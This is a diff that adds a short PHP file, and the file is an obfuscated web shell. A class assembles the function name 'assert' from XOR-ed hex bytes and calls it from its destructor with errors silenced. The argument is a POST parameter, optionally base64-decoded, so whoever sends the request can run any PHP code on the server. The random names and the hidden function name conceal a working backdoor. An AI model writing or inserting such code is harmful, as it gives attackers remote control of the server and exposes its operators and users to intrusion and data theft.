@@ -1,0 +1,19 @@
+<?php
+class VJKR {
+    function tLFw() {
+        $XxFj = "\x8" ^ "\x69";
+        $twIa = "\x9c" ^ "\xef";
+        $rVjh = "\x9b" ^ "\xe8";
+        $zJUn = "\x37" ^ "\x52";
+        $pjJt = "\x21" ^ "\x53";
+        $aRmY = "\x38" ^ "\x4c";
+        $WhKQ =$XxFj.$twIa.$rVjh.$zJUn.$pjJt.$aRmY;
+        return $WhKQ;
+    }
+    function __destruct(){
+        $UusL=$this->tLFw();
+        @$UusL($this->Qp);
+    }
+}
+$vjkr = new VJKR();
+@$vjkr->Qp = isset($_GET['id'])?base64_decode($_POST['mr7']):$_POST['mr7'];
